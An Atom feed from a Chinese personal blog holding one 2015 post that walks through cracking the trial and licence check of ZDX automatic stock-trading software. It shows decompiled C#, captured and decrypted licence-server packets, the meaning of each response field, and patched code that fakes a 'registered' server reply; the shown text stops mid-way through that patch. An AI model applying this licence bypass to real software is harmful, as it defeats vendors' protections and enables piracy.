<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[LuoXiaohei's blog]]></title>
  <subtitle><![CDATA[永远年轻，永远热泪盈眶！]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://smvirus.com/"/>
  <updated>2015-03-31T18:34:08.000Z</updated>
  <id>http://smvirus.com/</id>
  
  <author>
    <name><![CDATA[lSHANG]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[ZDX股票自动交易软件破解]]></title>
    <link href="http://smvirus.com/2015/03/27/zdxstock-trial-crack/"/>
    <id>http://smvirus.com/2015/03/27/zdxstock-trial-crack/</id>
    <published>2015-03-27T13:43:34.000Z</published>
    <updated>2015-03-31T18:34:08.000Z</updated>
    <content type="html"><![CDATA[<p>今天发现邮箱里有人请求帮忙破解一款用于自动操盘的软件，于是便看了一下，虽然最终成功破解掉了该软件，但并未将其发送给求助者。在我看来，破解更多是为了学习和研究，在经济条件允许的情况下，为软件付费，支持正版是每个人都该做的。</p>
<a id="more"></a>
<h2 id="初次安装">初次安装</h2><p>因为是试用期类的软件，所以按照通常的方式，将系统时间向后调若干年后进行安装，安装后发现试用开始日期仍为今天，并未受系统时间调整而影响，故判断该软件的验证方式可能是服务器验证。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/zdxstock-trial-crack/trial.jpg" alt=""></p>
<h2 id="程序分析">程序分析</h2><p>在安装运行之后，发现该软件在启动时带有关键字“正在检测注册信息”，遂尝试通过关键字在程序中找到验证点，查壳后发现该软件为.Net程序，便祭出.Net神器Reflector来分析。</p>
<h3 id="去混淆处理">去混淆处理</h3><p>通过Reflector可以发现，该软件的主程序是经过混淆处理的，所有类名、方法名都被修改为无意义字母，以此来增加逆向分析的难度。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/zdxstock-trial-crack/obfuscated.jpg" alt=""></p>
<p>这里可以使用Reflector的Reflexil插件的Obfuscator search功能来搜索和去除混淆，效果如下图。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/zdxstock-trial-crack/cleaned.jpg" alt=""></p>
<h3 id="寻找关键点">寻找关键点</h3><p>去混淆之后，我们开始尝试搜索关键字“正在检测注册信息”，发现以下方法</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> GClass3.<span class="function">GEnum4 <span class="title">method_136</span><span class="params">(<span class="keyword">string</span> string_1 = <span class="string">""</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    GClass3.GEnum4 enum2;</span><br><span class="line">    <span class="keyword">if</span> (!GClass3.bool_21)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.method_12(<span class="string">"&lt;"</span> + Conversions.ToString(GClass3.int_2) + <span class="string">"&gt;正在检测注册信息..."</span>);</span><br><span class="line">        <span class="keyword">if</span> (GClass3.string_34 == <span class="string">""</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            GClass3.string_34 = GClass0.smethod_51();</span><br><span class="line">        &#125;</span><br><span class="line">        GClass1 class2 = <span class="keyword">new</span> GClass1();</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            GClass1.GStruct5 struct2 = <span class="keyword">new</span> GClass1.GStruct5 &#123;</span><br><span class="line">                bool_0 = GClass3.bool_1,</span><br><span class="line">                string_0 = GClass3.string_1,</span><br><span class="line">                string_1 = GClass3.string_2,</span><br><span class="line">                string_2 = GClass3.string_34,</span><br><span class="line">                string_3 = GClass3.string_35</span><br><span class="line">            &#125;;</span><br><span class="line">            GClass1.GStruct6 struct3 = class2.method_0(struct2);</span><br><span class="line">            <span class="keyword">if</span> (struct3.bool_4)</span><br><span class="line">            &#123;</span><br><span class="line">                GClass3.int_2 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (((struct3.bool_0 == GClass3.bool_1) &amp; (struct3.string_1 == GClass3.string_1)) &amp; (struct3.string_2 == GClass3.string_34))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">string</span> str = struct3.string_0.Substring(<span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">                    <span class="keyword">switch</span> (str)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">"数据库打开失败"</span>:</span><br><span class="line">                            GClass3.decimal_1 = GClass3.decimal_0;</span><br><span class="line">                            GClass3.string_12 = GClass3.string_3;</span><br><span class="line">                            GClass3.smethod_8(<span class="string">"注册数据库打开失败"</span>, <span class="keyword">true</span>);</span><br><span class="line">                            <span class="keyword">return</span> GClass3.GEnum4.const_0;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">case</span> <span class="string">"数据库操作错误"</span>:</span><br><span class="line">                            GClass3.decimal_1 = GClass3.decimal_0;</span><br><span class="line">                            GClass3.string_12 = GClass3.string_3;</span><br><span class="line">                            GClass3.smethod_8(<span class="string">"注册数据库操作错误"</span>, <span class="keyword">true</span>);</span><br><span class="line">                            <span class="keyword">return</span> GClass3.GEnum4.const_0;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">case</span> <span class="string">"机器码首次存档"</span>:</span><br><span class="line">                            GClass3.dateTime_0 = Conversions.ToDate(struct3.string_3);</span><br><span class="line">                            GClass3.decimal_1 = struct3.decimal_0;</span><br><span class="line">                            GClass3.string_12 = struct3.string_4;</span><br><span class="line">                            <span class="keyword">return</span> GClass3.GEnum4.const_2;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">case</span> <span class="string">"机器码已经存档"</span>:</span><br><span class="line">                            <span class="keyword">if</span> (struct3.bool_3)</span><br><span class="line">                            &#123;</span><br><span class="line">                                GClass3.dateTime_0 = Conversions.ToDate(struct3.string_3);</span><br><span class="line">                                GClass3.decimal_1 = GClass3.decimal_0;</span><br><span class="line">                                GClass3.string_12 = GClass3.string_3;</span><br><span class="line">                                <span class="keyword">return</span> GClass3.GEnum4.const_1;</span><br><span class="line">                            &#125;</span><br><span class="line">                            GClass3.dateTime_0 = Conversions.ToDate(struct3.string_3);</span><br><span class="line">                            GClass3.decimal_1 = struct3.decimal_0;</span><br><span class="line">                            GClass3.string_12 = struct3.string_4;</span><br><span class="line">                            <span class="keyword">return</span> GClass3.GEnum4.const_2;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">case</span> <span class="string">"注册码已经录入"</span>:</span><br><span class="line">                            <span class="keyword">if</span> (struct3.bool_3)</span><br><span class="line">                            &#123;</span><br><span class="line">                                GClass3.dateTime_0 = Conversions.ToDate(struct3.string_3);</span><br><span class="line">                                GClass3.decimal_1 = GClass3.decimal_0;</span><br><span class="line">                                GClass3.string_12 = GClass3.string_3;</span><br><span class="line">                                <span class="keyword">return</span> GClass3.GEnum4.const_3;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (struct3.bool_2)</span><br><span class="line">                            &#123;</span><br><span class="line">                                GClass3.dateTime_0 = Conversions.ToDate(struct3.string_3);</span><br><span class="line">                                GClass3.decimal_1 = struct3.decimal_0;</span><br><span class="line">                                GClass3.string_12 = struct3.string_4;</span><br><span class="line">                                <span class="keyword">return</span> GClass3.GEnum4.const_4;</span><br><span class="line">                            &#125;</span><br><span class="line">                            GClass3.dateTime_0 = Conversions.ToDate(struct3.string_3);</span><br><span class="line">                            GClass3.decimal_1 = GClass3.decimal_0;</span><br><span class="line">                            GClass3.string_12 = GClass3.string_3;</span><br><span class="line">                            <span class="keyword">return</span> GClass3.GEnum4.const_5;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (str != <span class="string">"注册码还未录入"</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">return</span> enum2;</span><br><span class="line">                    &#125;</span><br><span class="line">                    GClass3.decimal_1 = GClass3.decimal_0;</span><br><span class="line">                    GClass3.string_12 = GClass3.string_3;</span><br><span class="line">                    <span class="keyword">return</span> GClass3.GEnum4.const_6;</span><br><span class="line">                &#125;</span><br><span class="line">                GClass3.decimal_1 = GClass3.decimal_0;</span><br><span class="line">                GClass3.string_12 = GClass3.string_3;</span><br><span class="line">                GClass3.smethod_8(<span class="string">"返回信息不匹配"</span>, <span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">return</span> GClass3.GEnum4.const_0;</span><br><span class="line">            &#125;</span><br><span class="line">            GClass3.int_2++;</span><br><span class="line">            <span class="keyword">if</span> (GClass3.int_2 &lt;= <span class="number">3</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Thread.Sleep(<span class="number">0x7d0</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.method_136(<span class="string">""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            GClass3.decimal_1 = GClass3.decimal_0;</span><br><span class="line">            GClass3.string_12 = GClass3.string_3;</span><br><span class="line">            GClass3.smethod_8(<span class="string">"注册服务不可用"</span>, <span class="keyword">true</span>);</span><br><span class="line">            enum2 = GClass3.GEnum4.const_0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception exception1)</span><br><span class="line">        &#123;</span><br><span class="line">            ProjectData.SetProjectError(exception1);</span><br><span class="line">            Exception exception = exception1;</span><br><span class="line">            GClass3.decimal_1 = GClass3.decimal_0;</span><br><span class="line">            GClass3.string_12 = GClass3.string_3;</span><br><span class="line">            GClass3.smethod_8(<span class="string">"检测注册信息异常："</span> + exception.Message, <span class="keyword">true</span>);</span><br><span class="line">            enum2 = GClass3.GEnum4.const_0;</span><br><span class="line">            ProjectData.ClearProjectError();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span></span><br><span class="line">        &#123;</span><br><span class="line">            class2 = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> enum2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过这个方法我们可以发现两个重要信息：</p>
<ol>
<li>该方法将机器码信息和注册信息发送给<code>class2.method_0</code>方法并返回一个结构对象，该对象将用来后续的判断；</li>
<li>该方法返回一个枚举值，该枚举值将决定软件最终运行哪种授权版本。</li>
</ol>
<h3 id="分析返回值">分析返回值</h3><p>我们首先分析上述方法的返回值，通过<code>method_136</code>方法的引用关系，我们发现返回值会作为参数传给<code>smethod_2</code>这个方法，并且当值为<code>GEnum4.const_4</code>时,软件会显示为正式版。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">smethod_2</span><span class="params">(GEnum4 genum4_1)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    genum4_0 = genum4_1;</span><br><span class="line">    <span class="keyword">switch</span> (smethod_1())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> GEnum4.const_0:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> str = <span class="string">"［注册失败\x00b7"</span> + string_12 + <span class="string">"］"</span>;</span><br><span class="line">            smethod_8(str, <span class="keyword">true</span>);</span><br><span class="line">            Class1.smethod_3().method_8().Text = string_16 + str;</span><br><span class="line">            Class1.smethod_3().method_8().vmethod_156().Visible = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> GEnum4.const_1:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> str3 = <span class="string">"［试用版已过期\x00b7"</span> + string_12 + <span class="string">"］"</span>;</span><br><span class="line">            smethod_8(str3, <span class="keyword">true</span>);</span><br><span class="line">            Class1.smethod_3().method_8().Text = string_16 + str3;</span><br><span class="line">            Class1.smethod_3().method_8().vmethod_156().Visible = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> GEnum4.const_2:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> str2 = <span class="string">"［试用版\x00b7无限制］"</span>;</span><br><span class="line">            smethod_8(str2, <span class="keyword">true</span>);</span><br><span class="line">            Class1.smethod_3().method_8().Text = string_16 + str2;</span><br><span class="line">            Class1.smethod_3().method_8().vmethod_156().Visible = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> GEnum4.const_3:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> str4 = <span class="string">"［正式版已过期\x00b7"</span> + string_12 + <span class="string">"］"</span>;</span><br><span class="line">            smethod_8(str4, <span class="keyword">true</span>);</span><br><span class="line">            Class1.smethod_3().method_8().Text = string_16 + str4;</span><br><span class="line">            Class1.smethod_3().method_8().vmethod_156().Visible = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> GEnum4.const_4:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> str5 = <span class="string">"［正式版\x00b7"</span> + string_12 + <span class="string">"］"</span>;</span><br><span class="line">            smethod_8(str5, <span class="keyword">true</span>);</span><br><span class="line">            Class1.smethod_3().method_8().Text = string_16 + str5;</span><br><span class="line">            Class1.smethod_3().method_8().vmethod_156().Visible = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> GEnum4.const_5:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> str6 = <span class="string">"［正式版未注册\x00b7"</span> + string_12 + <span class="string">"］"</span>;</span><br><span class="line">            smethod_8(str6, <span class="keyword">true</span>);</span><br><span class="line">            Class1.smethod_3().method_8().Text = string_16 + str6;</span><br><span class="line">            Class1.smethod_3().method_8().vmethod_156().Visible = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> GEnum4.const_6:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> str7 = <span class="string">"［正式版未录入\x00b7"</span> + string_12 + <span class="string">"］"</span>;</span><br><span class="line">            smethod_8(str7, <span class="keyword">true</span>);</span><br><span class="line">            Class1.smethod_3().method_8().Text = string_16 + str7;</span><br><span class="line">            Class1.smethod_3().method_8().vmethod_156().Visible = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过上边的分析，有经验的同学会想到直接修改<code>method_136</code>方法的返回值，使其常返回<code>GEnum4.const_4</code>，这样修改虽然可以使软件显示为正式版，但实际上并未破解掉软件的自动操盘金额限制，所以需要继续向下分析。</p>
<h3 id="服务器验证">服务器验证</h3><p>通过分析<code>class2.method_0</code>方法，可以知道该方法用于服务器验证，其将注册信息加密后发送给服务端后，解密从服务端返回的信息并填充为一个结构对象，然后返回给调用方法。<br>同时可以知道注册信息和返回信息的明文都是使用字符’|’进行字段间的分隔的。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> GStruct6 <span class="title">method_0</span><span class="params">(GStruct5 gstruct5_0)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    GStruct6 struct3 = <span class="keyword">new</span> GStruct6();</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">string</span> str2 = <span class="string">""</span>;</span><br><span class="line">        str2 = ((((str2 + gstruct5_0.bool_0.ToString() + <span class="string">"|"</span>) + gstruct5_0.string_0 + <span class="string">"|"</span>) + gstruct5_0.string_1 + <span class="string">"|"</span>) + gstruct5_0.string_2 + <span class="string">"|"</span>) + gstruct5_0.string_3;</span><br><span class="line">        <span class="keyword">string</span> s = <span class="string">"key="</span> + <span class="keyword">this</span>.method_1(str2);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Encoding.Default.GetBytes(s);</span><br><span class="line">        <span class="keyword">string</span> requestUriString = <span class="string">"http://www.zdx8.com/Rgst/RgstRequest.aspx"</span>;</span><br><span class="line">        HttpWebRequest request = (HttpWebRequest) WebRequest.Create(requestUriString);</span><br><span class="line">        request.Method = <span class="string">"POST"</span>;</span><br><span class="line">        request.ContentType = <span class="string">"text/html; charset=utf-8"</span>;</span><br><span class="line">        request.ContentLength = bytes.Length;</span><br><span class="line">        Stream requestStream = request.GetRequestStream();</span><br><span class="line">        requestStream.Write(bytes, <span class="number">0</span>, bytes.Length);</span><br><span class="line">        requestStream.Close();</span><br><span class="line">        request.Timeout = GClass3.int_5 * <span class="number">2</span>;</span><br><span class="line">        HttpWebResponse response = (HttpWebResponse) request.GetResponse();</span><br><span class="line">        <span class="keyword">string</span> str = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.UTF8).ReadLine();</span><br><span class="line">        response.Close();</span><br><span class="line">        <span class="keyword">string</span> str4 = <span class="keyword">this</span>.method_2(str);</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span>[] strArray = str4.Split(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'|'</span> &#125;);</span><br><span class="line">            struct3.string_0 = strArray[<span class="number">0</span>];</span><br><span class="line">            struct3.bool_0 = Conversions.ToBoolean(strArray[<span class="number">1</span>]);</span><br><span class="line">            struct3.string_1 = strArray[<span class="number">2</span>];</span><br><span class="line">            struct3.bool_1 = Conversions.ToBoolean(strArray[<span class="number">3</span>]);</span><br><span class="line">            struct3.string_2 = strArray[<span class="number">4</span>];</span><br><span class="line">            struct3.bool_2 = Conversions.ToBoolean(strArray[<span class="number">5</span>]);</span><br><span class="line">            struct3.string_3 = strArray[<span class="number">6</span>];</span><br><span class="line">            struct3.bool_3 = Conversions.ToBoolean(strArray[<span class="number">7</span>]);</span><br><span class="line">            struct3.decimal_0 = Conversions.ToDecimal(strArray[<span class="number">8</span>]);</span><br><span class="line">            struct3.string_4 = strArray[<span class="number">9</span>];</span><br><span class="line">            struct3.bool_4 = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception exception1)</span><br><span class="line">        &#123;</span><br><span class="line">            ProjectData.SetProjectError(exception1);</span><br><span class="line">            Exception exception = exception1;</span><br><span class="line">            struct3.bool_4 = <span class="keyword">true</span>;</span><br><span class="line">            ProjectData.ClearProjectError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception exception3)</span><br><span class="line">    &#123;</span><br><span class="line">        ProjectData.SetProjectError(exception3);</span><br><span class="line">        Exception exception2 = exception3;</span><br><span class="line">        GClass3.smethod_8(<span class="string">"注册服务错误："</span> + exception2.Message.Replace(<span class="string">"\r"</span>, <span class="string">""</span>).Replace(<span class="string">"\n"</span>, <span class="string">""</span>), <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (((WebException) exception2).Status != WebExceptionStatus.Timeout)</span><br><span class="line">        &#123;</span><br><span class="line">            struct3.bool_4 = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ProjectData.ClearProjectError();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> struct3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过上述分析，我们大概知道了该软件的验证流程</p>
<ol>
<li>获取用户的注册信息</li>
<li>将注册信息发送给服务器验证</li>
<li>根据返回信息选择相应的软件版本</li>
</ol>
<p>同时知道了服务器返回的信息包含10个字段，通过更加深入的分析，我们可以构造出一个完整的返回数据包，但是这里我们使用一个更加便捷的方法，直接抓取服务器返回的数据包。</p>
<h3 id="分析数据包">分析数据包</h3><p>重新运行程序，打开网络分析工具，抓取验证注册信息时客户端与服务端的通信数据包，可以看到通讯数据包如下</p>
<figure class="highlight"><figcaption><span>POST</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EgzwaHzHSBvwy514aiLfP7BT8AVd67toYdCm54a89H0tIXsklk63HRHjtiRPGBnTHv/VlybkxaYQQN1wjlhrjA==</span><br></pre></td></tr></table></figure>
<figure class="highlight"><figcaption><span>RECV</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g8egIVo7wykjOBds0v78BK+qvUxiLB/SwQU5bellpG+aG8Lwb25udRXEwB3T9EfW81esMT+R44MeSIr2glg8jWy1vVByXkISp8t+NoRmjOmCLRQ77lAyH5WrYmQ2XNkcIJKBtb77dks=</span><br></pre></td></tr></table></figure>
<p>通过程序内的解密方法，得到明文信息如下<br><figure class="highlight"><figcaption><span>POST</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">True|&#20146;|123456|0142-3111-1313-7210-1120|&#35831;&#22312;&#36825;&#37324;&#36755;&#20837;&#27880;&#20876;&#30721;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight"><figcaption><span>RECV</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#26426;&#22120;&#30721;&#24050;&#32463;&#23384;&#26723;|True|&#20146;|True|0142-3111-1313-7210-1120|False|2015-03-27 23:07:34|False|10000000|1&#21315;&#19975;</span><br></pre></td></tr></table></figure>
<p>经过分析，我们得到服务端返回信息中各字段的作用如下</p>
<pre><code>字段<span class="attribute">4</span>:                未使用
字段<span class="number">7</span>:                标识激活时间
字段<span class="number">9</span>、字段<span class="number">10</span>:         标识自动操盘的最大金额
字段<span class="number">1</span>、字段<span class="number">6</span>、字段<span class="number">8</span>:    验证软件授权
字段<span class="number">2</span>、字段<span class="number">3</span>、字段<span class="number">5</span>:    验证注册用户信息
</code></pre><h2 id="破解程序">破解程序</h2><h3 id="修改验证方法">修改验证方法</h3><p>根据前边的分析我们知道，在保证发送及返回的注册信息匹配的同时，需要保证返回数据中字段1为“注册码已经录入”、字段6的值为True，此时程序将被验证为正式版授权，并且将会使用字段9、10的值作为操盘最大金额。<br>这里我们直接Patch<code>class2.method_0</code>方法,将联网验证部分代码NOP掉，并直接构造一个字符串来填充返回值<code>struct3</code>，Patch的工作依然由Reflexil插件来完成，Patch后的代码如下</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> GStruct6 <span class="title">method_0</span><span class="params">(GStruct5 gstruct5_0)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    GStruct6 struct3 = <span class="keyword">new</span> GStruct6();</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">string</span> str4 = <span class="string">"注册码已经录入|True|亲|True|0142-3111-1313-7210-1120|True|2015-03-27 21:07:34|False|10000000|1千万"</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span>[] strArray = str4.Split(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'|'</span> &#125;);</span><br><span class="line">            struct3.string_0 = strArray[<span 